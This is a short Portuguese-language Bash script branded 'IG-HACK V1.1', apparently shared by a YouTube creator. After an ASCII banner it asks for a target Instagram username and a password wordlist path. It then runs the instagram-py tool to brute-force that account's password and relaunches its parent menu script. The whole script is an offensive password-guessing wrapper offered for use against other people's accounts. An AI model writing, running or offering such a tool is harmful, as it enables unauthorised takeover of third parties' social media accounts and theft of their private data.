#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#seção de codificação começa :)
clear
echo
echo '
    ██╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██║██╔════╝       ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ██║██║  ███╗█████╗███████║███████║██║V1.1 █████╔╝
    ██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗
    ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
              [#] Manual Ataque de senhak [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By Gilmar Script << \e[0m\n"
printf "\n"
printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Gilmar Filho \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] Nome do usuário : " usrnm
echo
read -p "[#] Insira o local da lista da senha : " inspass
echo
if [[ $inspass = 0 ]]                                             
then
echo -e  "$ylo >>> exiting........! Thau Thau :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
cd $HOME
fi
cd $HOME/ig-hack
bash ighack.sh
